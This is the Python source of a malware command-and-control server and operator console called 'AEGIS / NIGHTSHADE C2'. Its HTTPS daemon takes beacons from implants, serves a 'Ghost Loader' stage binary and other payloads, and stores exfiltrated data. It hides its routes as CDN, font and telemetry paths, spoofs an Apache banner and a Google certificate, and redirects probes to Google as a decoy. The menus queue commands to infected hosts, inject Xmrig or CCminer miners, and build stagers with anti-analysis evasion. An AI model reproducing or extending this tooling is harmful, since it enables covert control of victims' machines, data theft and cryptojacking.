import http.server
import ssl
import json
import threading
import struct
import time
import os
import sys
import base64
import random
import re
import errno
import argparse
import signal
import fcntl
from urllib.parse import urlparse, parse_qs
from datetime import datetime

# Import our config editor
import config_editor

# ── Resolve absolute path to project root ─────────────────────────────────
# This ensures the server works regardless of which directory it's launched from.
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
PROJECT_ROOT = os.path.abspath(os.path.join(SCRIPT_DIR, ".."))

# ── Global Constants & Paths ──────────────────────────────────────────────
LOG_FILE_PATH = os.path.join(SCRIPT_DIR, "c2_server.log")
STATE_FILE_PATH = os.path.join(SCRIPT_DIR, "c2_state.json")
PID_FILE_PATH = os.path.join(SCRIPT_DIR, "c2_server.pid")

# Global State (Daemon Mode)
AGENTS = {}  # {node_id_hex: {"last_seen": timestamp, "info": {...}, "tasks": []}}
ACTIVE_AGENT = None
SERVER_RUNNING = True
HTTPD_INSTANCE = None # Keep track of the server instance to shut it down properly

# Colors for TUI
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# ── Persistent State Management (with Locking) ─────────────────────────────

def save_state():
    """Persist agents and tasks to disk (Daemon Mode)."""
    try:
        data = {
            "agents": AGENTS,
            "updated_at": datetime.now().isoformat()
        }
        with open(STATE_FILE_PATH, "w") as f:
            fcntl.flock(f, fcntl.LOCK_EX)
            json.dump(data, f, indent=2)
            fcntl.flock(f, fcntl.LOCK_UN)
    except Exception as e:
        log_print(f"[!] Error saving state: {e}", Colors.FAIL)

def load_state():
    """Load agents and tasks from disk (TUI Mode)."""
    global AGENTS
    if os.path.exists(STATE_FILE_PATH):
        try:
            with open(STATE_FILE_PATH, "r") as f:
                fcntl.flock(f, fcntl.LOCK_SH)
                data = json.load(f)
                AGENTS = data.get("agents", {})
                fcntl.flock(f, fcntl.LOCK_UN)
        except Exception:
            pass

def update_agent_task(node_id, task):
    """
    Append a task to an agent in the state file.
    Used by the TUI to task the Daemon.
    """
    if os.path.exists(STATE_FILE_PATH):
        try:
            # Read-Modify-Write cycle with exclusive lock
            with open(STATE_FILE_PATH, "r+") as f:
                fcntl.flock(f, fcntl.LOCK_EX)
                data = json.load(f)
                agents = data.get("agents", {})

                if node_id in agents:
                    agents[node_id]["tasks"].append(task)

                    # Rewind and write
                    f.seek(0)
                    f.truncate()
                    data["agents"] = agents
                    data["updated_at"] = datetime.now().isoformat()
                    json.dump(data, f, indent=2)

                fcntl.flock(f, fcntl.LOCK_UN)
            return True
        except Exception as e:
            print(f"Error queuing task: {e}")
            return False
    return False

# ── Logging Helper ────────────────────────────────────────────────────────

def log_print(msg, color=None):
    """Print to stdout and append to log file."""
    timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S] ")
    clean_msg = re.sub(r'\x1b\[[0-9;]*m', '', msg) # Remove ANSI codes for file

    with open(LOG_FILE_PATH, "a") as f:
        f.write(timestamp + clean_msg + "\n")

    if color:
        print(f"{color}{msg}{Colors.ENDC}")
    else:
        print(msg)

# ── C2 Envelope structure (must match c2_client.h) ────────────────────────
ENVELOPE_FMT = "<IIII12s16s16s"   # little-endian, packed
ENVELOPE_SIZE = struct.calcsize(ENVELOPE_FMT)
C2_MAGIC = 0xAE610C2D

# Message types (from c2_client.h)
C2_MSG_BEACON       = 0x01
C2_MSG_TASK_REQ     = 0x02
C2_MSG_TASK_RESP    = 0x03
C2_MSG_PAYLOAD_REQ  = 0x04
C2_MSG_PAYLOAD_DATA = 0x05
C2_MSG_REKEY        = 0x06
C2_MSG_STAGE_REQ    = 0x07
C2_MSG_STAGE_DATA   = 0x08
C2_MSG_EXFIL        = 0x09
C2_MSG_HEARTBEAT    = 0x0A
C2_MSG_RESOURCE_REQ = 0x0B

def parse_envelope(data):
    """Parse a C2 envelope from raw bytes. Returns (envelope_dict, ciphertext) or (None, None)."""
    if len(data) < ENVELOPE_SIZE:
        return None, None

    magic, msg_type, payload_len, sequence, iv, tag, node_id = \
        struct.unpack(ENVELOPE_FMT, data[:ENVELOPE_SIZE])

    if magic != C2_MAGIC:
        return None, None

    env = {
        "magic": magic,
        "msg_type": msg_type,
        "payload_len": payload_len,
        "sequence": sequence,
        "iv": iv,
        "tag": tag,
        "node_id": node_id,
        "node_id_hex": node_id.hex(),
    }

    ciphertext = data[ENVELOPE_SIZE:]
    return env, ciphertext


# --- C2 Logic (Daemon) ----------------------------------------------------

class ReusableHTTPServer(http.server.HTTPServer):
    allow_reuse_address = True

class AegisC2Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        # Suppress default logging to keep CLI clean
        pass

    def version_string(self):
        # Override default server version string to prevent fingerprinting
        return "Apache"

    def do_GET(self):
        # ── Health Check ──────────────────────────────────────────────────
        if self.path == '/health':
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()

            status = {
                "status": "active",
                "uptime": "TODO", # Ideally track start time
                "agents_online": len(AGENTS),
                "timestamp": datetime.now().isoformat(),
                "config": {
                    "primary_host": config_editor.get_config_value("AEGIS_C2_PRIMARY_HOST"),
                    "primary_port": config_editor.get_config_value("AEGIS_C2_PRIMARY_PORT"),
                }
            }
            self.wfile.write(json.dumps(status, indent=2).encode())
            return

        # Handle GET requests (e.g. browser/curl probes) gracefully
        # Return a decoy redirect to a benign site
        self.send_response(302)
        self.send_header('Location', 'https://www.google.com')
        self.end_headers()

    def do_POST(self):
        # Refresh state from disk to catch new tasks from TUI
        load_state()

        path = self.path

        content_len = int(self.headers.get('Content-Length', 0))
        post_body = self.rfile.read(content_len) if content_len > 0 else b""

        response_body = b""

        # ── Route: Beacon (/api/v1/assets/XXXXXXXX/upload) ────────────────
        beacon_match = re.search(r'/api/v1/assets/([0-9a-fA-F]+)/upload', path)

        # ── Route: Stage request (/cdn/dist/XXXXXXXX/bundle.js) ───────────
        stage_match = re.search(r'/cdn/dist/([0-9a-fA-F]+)/bundle\.js', path)

        # ── Route: Resource fetch (/cdn/assets/RESOURCE_ID) ───────────────
        resource_match = re.search(r'/cdn/assets/([^/]+)', path)

        # ── Route: Payload request (/static/fonts/XXXXXXXX.woff2) ─────────
        payload_match = re.search(r'/static/fonts/([0-9a-fA-F]+)\.woff2', path)

        # ── Route: Exfiltration (/api/telemetry/XXXXXXXX) ─────────────────
        exfil_match = re.search(r'/api/telemetry/([0-9a-fA-F]+)', path)

        if beacon_match:
            response_body = self._handle_beacon(post_body)
        elif stage_match:
            response_body = self._handle_stage_req(post_body)
        elif resource_match:
            resource_id = resource_match.group(1)
            response_body = self._handle_resource_req(resource_id)
        elif payload_match:
            response_body = self._handle_payload_req(post_body)
        elif exfil_match:
            self._handle_exfil(post_body)
            response_body = b""
        else:
            # Unknown route — log it
            log_print(f"[?] Unknown POST route: {path}", Colors.WARNING)

        # Save any state updates (e.g. last_seen, cleared tasks)
        save_state()

        self.send_response(200)
        self.send_header('Content-Type', 'application/octet-stream')
        self.send_header('Connection', 'close')
        self.end_headers()
        try:
            self.wfile.write(response_body)
        except ssl.SSLEOFError:
            # Client disconnected early or protocol violation
            pass
        except BrokenPipeError:
            pass

    def _handle_beacon(self, data):
        """
        Process a beacon from the stager/agent.
        """
        client_ip = self.client_address[0]
        env, ct = parse_envelope(data)

        if env:
            node_id_hex = env["node_id_hex"]
            seq = env["sequence"]
            msg_type = env["msg_type"]

            # Use first 8 hex chars for display
            short_id = node_id_hex[:8]

            if node_id_hex not in AGENTS:
                AGENTS[node_id_hex] = {
                    "first_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "ip": client_ip,
                    "info": {},
                    "tasks": [],
                    "sequence": seq,
                }
                log_print(f"[+] New Agent: {short_id} from {client_ip} (seq={seq})", Colors.GREEN)
            else:
                log_print(f"[~] Beacon: {short_id} from {client_ip} (seq={seq})", Colors.CYAN)

            agent = AGENTS[node_id_hex]
            agent["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            agent["ip"] = client_ip
            agent["sequence"] = seq

            if agent["tasks"]:
                tasks = agent["tasks"]
                log_print(f"  └─ Sending {len(tasks)} task(s) to {short_id}", Colors.WARNING)
                # In a real impl, we'd pack these. For now, we just clear them.
                agent["tasks"] = []
        else:
            log_print(f"[?] Beacon from {client_ip} with unparseable envelope ({len(data)} bytes)", Colors.WARNING)
            # Basic IP tracking fallback omitted for brevity in daemon mode

        return b""

    def _handle_stage_req(self, data):
        """
        Handle a stage request — the stager is asking for the Ghost Loader binary.
        """
        client_ip = self.client_address[0]
        env, ct = parse_envelope(data)

        short_id = "unknown"
        if env:
            short_id = env["node_id_hex"][:8]

        log_print(f"[⬇] Stage request from {short_id} ({client_ip})", Colors.BLUE)

        # Look for the ghost loader binary in known locations
        ghost_paths = [
            os.path.join(PROJECT_ROOT, "build", "aegis_ghost_loader"),
            os.path.join(PROJECT_ROOT, "payloads", "ghost_loader"),
            os.path.join(PROJECT_ROOT, "build", "ghost_loader"),
        ]

        for gpath in ghost_paths:
            if os.path.exists(gpath):
                with open(gpath, "rb") as f:
                    ghost_data = f.read()
                log_print(f"  └─ Sending Ghost Loader ({len(ghost_data)} bytes)...", Colors.GREEN)
                log_print(f"  └─ Waiting for Ghost Loader execution...", Colors.GREEN)
                return ghost_data

        log_print(f"  └─ Ghost loader not found in any known path!", Colors.FAIL)
        log_print(f"     Searched: {', '.join(ghost_paths)}", Colors.FAIL)
        return b""

    def _handle_resource_req(self, resource_id):
        """Serve a requested resource (ELF binary, payload, etc.) from the payloads directory."""
        payloads_dir = os.path.join(PROJECT_ROOT, "payloads")
        path = os.path.join(payloads_dir, resource_id)

        if os.path.exists(path):
            with open(path, "rb") as f:
                data = f.read()
            log_print(f"[⬇] Serving resource: {resource_id} ({len(data)} bytes)", Colors.GREEN)
            return data

        log_print(f"[!] Resource not found: {resource_id}", Colors.FAIL)
        return b""

    def _handle_payload_req(self, data):
        """Handle a payload module request from the Nanomachine."""
        client_ip = self.client_address[0]
        env, ct = parse_envelope(data)

        short_id = "unknown"
        if env:
            short_id = env["node_id_hex"][:8]

        log_print(f"[⬇] Payload request from {short_id} ({client_ip})", Colors.BLUE)

        # Check for a default payload in the payloads directory
        payloads_dir = os.path.join(PROJECT_ROOT, "payloads")
        if os.path.exists(payloads_dir):
            payloads = os.listdir(payloads_dir)
            if payloads:
                # Return the first available payload
                ppath = os.path.join(payloads_dir, payloads[0])
                with open(ppath, "rb") as f:
                    payload_data = f.read()
                log_print(f"  └─ Serving payload: {payloads[0]} ({len(payload_data)} bytes)", Colors.GREEN)
                return payload_data

        log_print(f"  └─ No payloads available", Colors.FAIL)
        return b""

    def _handle_exfil(self, data):
        """Log exfiltrated data from the agent."""
        client_ip = self.client_address[0]
        env, ct = parse_envelope(data)

        short_id = "unknown"
        if env:
            short_id = env["node_id_hex"][:8]

        log_print(f"[📤] Exfil received from {short_id} ({client_ip}): {len(data)} bytes", Colors.WARNING)

        # Write to exfil directory for inspection
        exfil_dir = os.path.join(PROJECT_ROOT, "exfil")
        os.makedirs(exfil_dir, exist_ok=True)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        exfil_path = os.path.join(exfil_dir, f"{short_id}_{ts}.bin")
        with open(exfil_path, "wb") as f:
            f.write(data)
        log_print(f"  └─ Saved to {exfil_path}", Colors.CYAN)


def run_daemon_server(port=443):
    global HTTPD_INSTANCE

    # Write PID file
    with open(PID_FILE_PATH, "w") as f:
        f.write(str(os.getpid()))

    # Initialize state file if not exists
    load_state()
    save_state()

    # Use absolute paths for SSL certs
    cert_path = os.path.join(PROJECT_ROOT, "server.pem")

    # Ensure SSL certs exist
    if not os.path.exists(cert_path):
        os.system(f"openssl req -new -x509 -keyout {cert_path} -out {cert_path} -days 365 -nodes -subj '/CN=www.google.com'")

    log_print(f"[+] Starting C2 Daemon on 0.0.0.0:{port}...", Colors.GREEN)

    server_address = ('0.0.0.0', port)

    try:
        httpd = ReusableHTTPServer(server_address, AegisC2Handler)
        HTTPD_INSTANCE = httpd
    except OSError as e:
        if e.errno == errno.EADDRINUSE:
            log_print(f"[!] Error: Port {port} is already in use.", Colors.FAIL)
            os.remove(PID_FILE_PATH)
            sys.exit(1)
        else:
            raise e

    # Wrap with SSL
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile=cert_path)
    httpd.socket = context.wrap_socket(httpd.socket, server_side=True)

    log_print(f"[+] C2 Daemon active. Listening...", Colors.GREEN)

    def signal_handler(sig, frame):
        log_print("[*] Caught signal, shutting down...", Colors.WARNING)
        if os.path.exists(PID_FILE_PATH):
            os.remove(PID_FILE_PATH)
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    while True:
        try:
            httpd.handle_request()
        except Exception as e:
            log_print(f"[!] Server error: {e}", Colors.FAIL)

# --- TUI Logic (Client) ---------------------------------------------------

def check_daemon_status():
    """Check if the daemon is running by reading the PID file."""
    if os.path.exists(PID_FILE_PATH):
        try:
            with open(PID_FILE_PATH, "r") as f:
                pid = int(f.read().strip())
            # Check if process actually exists
            try:
                os.kill(pid, 0)
                return pid
            except OSError:
                return None
        except (OSError, ValueError):
            # Stale PID file
            return None
    return None

def start_daemon_background():
    """Launch the server in daemon mode as a subprocess."""
    # Get configured port
    port_str = config_editor.get_config_value("AEGIS_C2_PRIMARY_PORT")
    c2_port = int(port_str) if port_str and port_str.isdigit() else 4443

    print(f"[*] Launching background daemon on port {c2_port}...")

    cmd = f"{sys.executable} {os.path.abspath(__file__)} --daemon"
    os.system(f"{cmd} > /dev/null 2>&1 &")

    time.sleep(2) # Give it a sec to start
    pid = check_daemon_status()
    if pid:
        print(f"{Colors.GREEN}[+] Daemon started (PID {pid}){Colors.ENDC}")
    else:
        print(f"{Colors.FAIL}[!] Failed to start daemon. Check logs.{Colors.ENDC}")

def stop_daemon():
    pid = check_daemon_status()
    if pid:
        try:
            os.kill(pid, signal.SIGTERM)
            print(f"{Colors.GREEN}[+] Daemon (PID {pid}) stopped.{Colors.ENDC}")
            time.sleep(1)
        except OSError as e:
            print(f"{Colors.FAIL}[!] Error stopping daemon: {e}{Colors.ENDC}")
    else:
        print("Daemon not running.")

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    clear_screen()
    pid = check_daemon_status()
    status = f"{Colors.GREEN}ONLINE (PID {pid}){Colors.ENDC}" if pid else f"{Colors.FAIL}OFFLINE{Colors.ENDC}"

    print(f"{Colors.HEADER}")
    print(r"""
    ███████╗███╗   ██╗██╗
    ██╔════╝████╗  ██║██║
    █████╗  ██╔██╗ ██║██║
    ██╔══╝  ██║╚██╗██║██║
    ███████╗██║ ╚████║██║
    ╚══════╝╚═╝  ╚═══╝╚═╝
    AEGIS / NIGHTSHADE C2
    """)
    print(f"    STATUS: {status}")
    print(f"{Colors.ENDC}")

def menu_main():
    print(f"{Colors.BOLD}=== Main Menu ==={Colors.ENDC}")
    print("[1] List Agents")
    print("[2] Interact with Agent")
    print("[3] Payload Builder (Anti-Analysis Config)")
    print("[4] Advanced Configuration")

    if check_daemon_status():
        print(f"[5] {Colors.FAIL}Stop Listener (Daemon){Colors.ENDC}")
    else:
        print(f"[5] {Colors.GREEN}Start Listener (Daemon){Colors.ENDC}")

    print("[6] View Logs")
    print("[0] Exit TUI")
    print()

def menu_builder():
    while True:
        print_banner()
        print(f"{Colors.BOLD}=== Payload Builder ==={Colors.ENDC}")

        settings = config_editor.get_aa_settings()

        print(f"Anti-Analysis Checks:")
        for key, enabled in settings.items():
            status = f"{Colors.GREEN}ON{Colors.ENDC}" if enabled else f"{Colors.FAIL}OFF{Colors.ENDC}"
            name = key.replace("AEGIS_AA_ENABLE_", "")
            print(f"  {name:<20} : {status}")

        print()
        print("[1] Toggle Check...")
        print("[2] Build Stager (Standard - ALL Components)")
        print("[3] Build Stager (CLEAN - No AA)")
        print("[0] Back")

        choice = input("Select > ")

        if choice == '1':
            key_suffix = input("Enter check name (e.g. PTRACE): ").upper()
            full_key = f"AEGIS_AA_ENABLE_{key_suffix}"
            if full_key in settings:
                config_editor.toggle_setting(full_key, not settings[full_key])
            else:
                print("Unknown check.")
                time.sleep(1)
        elif choice == '2':
            # Run full make all
            os.system(f"make -C {PROJECT_ROOT} clean && make -C {PROJECT_ROOT} all")
            input("Build complete. Press Enter.")
        elif choice == '3':
            # Run full make all with AA disabled
            os.system(f"make -C {PROJECT_ROOT} clean && make -C {PROJECT_ROOT} all CFLAGS+=-DAEGIS_DISABLE_AA")
            input("Clean Build complete. Press Enter.")
        elif choice == '0':
            break

def menu_interact():
    load_state() # Refresh agents
    if not AGENTS:
        print("No agents connected.")
        time.sleep(1)
        return

    print("Active Agents:")
    agent_list = []
    for idx, (aid, info) in enumerate(AGENTS.items()):
        short_id = aid[:8] if len(aid) > 8 else aid
        last_seen = info.get('last_seen', 'never')
        ip = info.get('ip', 'unknown')
        print(f"  [{idx}] {short_id} ({ip}) Last Seen: {last_seen}")
        agent_list.append(aid)

    try:
        target_idx = int(input("Enter Agent Index > "))
        if target_idx < 0 or target_idx >= len(agent_list):
            print("Invalid index.")
            return
        target = agent_list[target_idx]
    except (ValueError, IndexError):
        return

    short_target = target[:8] if len(target) > 8 else target

    while True:
        print_banner()
        print(f"{Colors.BLUE}Interacting with {short_target} ({AGENTS[target]['ip']}){Colors.ENDC}")
        print("[1] Task: Execute Command (Shellcode/ELF)")
        print("[2] Task: Inject Payload (Xmrig/CCminer)")
        print("[0] Back")

        choice = input("Select > ")
        if choice == '1':
            cmd = input("Resource ID to execute (e.g. 'xmrig'): ")
            update_agent_task(target, f"exec {cmd}")
            print(f"Task queued for {short_target}")
            time.sleep(1)
        elif choice == '2':
            print("Available payloads in /payloads/:")
            payloads_dir = os.path.join(PROJECT_ROOT, "payloads")
            try:
                for f in os.listdir(payloads_dir):
                    fpath = os.path.join(payloads_dir, f)
                    fsize = os.path.getsize(fpath)
                    print(f"  - {f} ({fsize} bytes)")
            except FileNotFoundError:
                print("  (No payloads directory found)")

            p = input("Payload name > ")
            update_agent_task(target, f"exec {p}")
            print("Injection task queued.")
            time.sleep(1)
        elif choice == '0':
            break

def menu_advanced_config():
    while True:
        print_banner()
        print(f"{Colors.BOLD}=== Advanced Configuration ==={Colors.ENDC}")

        params = [
            "AEGIS_AA_RDTSC_THRESHOLD",
            "AEGIS_AA_SLEEP_CHECK_MS",
            "AEGIS_AA_MIN_CPU_CORES",
            "AEGIS_AA_MIN_RAM_MB",
            "AEGIS_AA_MIN_DISK_GB",
            "AEGIS_AA_MIN_UPTIME_SEC",
            "AEGIS_BEACON_INTERVAL_MS",
            "AEGIS_C2_PRIMARY_HOST",
            "AEGIS_C2_PRIMARY_PORT",
        ]

        for p in params:
            val = config_editor.get_config_value(p)
            print(f"  {p:<30} : {val}")

        print()
        print("[1] Edit Parameter")
        print("[0] Back")

        choice = input("Select > ")
        if choice == '1':
            param = input("Parameter Name: ")
            if config_editor.get_config_value(param) is None:
                print("Parameter not found.")
                time.sleep(1)
                continue
            new_val = input("New Value: ")
            config_editor.set_config_value(param, new_val)
            print("Updated.")
            time.sleep(0.5)
        elif choice == '0':
            break

def main_loop():
    while True:
        print_banner()
        menu_main()

        # Non-blocking input handling could be better, but standard input() is fine
        # provided we handle the daemon separately.
        try:
            choice = input("Select > ")
        except EOFError:
            break

        if choice == '1':
            load_state()
            if not AGENTS:
                print("No agents.")
            else:
                print(f"{'ID':<12} {'IP':<18} {'First Seen':<22} {'Last Seen':<22}")
                print("-" * 74)
                for aid, info in AGENTS.items():
                    short_id = aid[:8] if len(aid) > 8 else aid
                    print(f"{short_id:<12} {info.get('ip', '?'):<18} {info.get('first_seen', '?'):<22} {info.get('last_seen', '?'):<22}")
            input("Press Enter...")
        elif choice == '2':
            menu_interact()
        elif choice == '3':
            menu_builder()
        elif choice == '4':
            menu_advanced_config()
        elif choice == '5':
            if check_daemon_status():
                stop_daemon()
            else:
                start_daemon_background()
            time.sleep(1)
        elif choice == '6':
            print_banner()
            print(f"{Colors.BOLD}=== Server Logs (Last 50 Lines) ==={Colors.ENDC}")
            try:
                if os.path.exists(LOG_FILE_PATH):
                    with open(LOG_FILE_PATH, "r") as f:
                        lines = f.readlines()
                        for line in lines[-50:]:
                            print(line.strip())
                else:
                    print("No logs found.")
            except Exception as e:
                print(f"Error reading logs: {e}")
            input("\nPress Enter to return...")
        elif choice == '0':
            print("Exiting TUI. Daemon status preserved.")
            sys.exit(0)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--daemon", action="store_true", help="Run in daemon mode (background listener)")
    args = parser.parse_args()

    # Ensure payloads dir exists
    payloads_dir = os.path.join(PROJECT_ROOT, "payloads")
    if not os.path.exists(payloads_dir):
        os.makedirs(payloads_dir)

    if args.daemon:
        # Get configured port
        port_str = config_editor.get_config_value("AEGIS_C2_PRIMARY_PORT")
        c2_port = int(port_str) if port_str and port_str.isdigit() else 4443
        run_daemon_server(c2_port)
    else:
        try:
            main_loop()
        except KeyboardInterrupt:
            print("\nExiting TUI...")
